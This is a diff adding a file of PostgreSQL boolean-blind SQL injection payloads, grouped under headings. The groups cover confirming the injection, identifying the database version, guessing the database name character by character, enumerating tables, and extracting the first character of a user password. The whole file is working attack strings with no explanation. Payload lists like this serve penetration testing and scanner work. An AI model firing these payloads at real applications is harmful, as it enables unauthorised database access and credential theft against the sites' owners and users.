@@ -1,0 +1,23 @@
+# PostgreSQL — Boolean Blind Payloads
+
+# --- Confirm boolean ---
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a'--
+' AND 'a'='b'--
+
+# --- Version ---
+' AND SUBSTRING(version(),1,10)='PostgreSQL'--
+' AND ASCII(SUBSTRING(version(),1,1))=80--
+
+# --- Database name ---
+' AND SUBSTRING(current_database(),1,1)='a'--
+' AND ASCII(SUBSTRING(current_database(),1,1))>96--
+' AND LENGTH(current_database())=5--
+
+# --- Table enumeration ---
+' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1),1,1)='u'--
+' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1),1,1))>100--
+
+# --- Data extraction ---
+' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
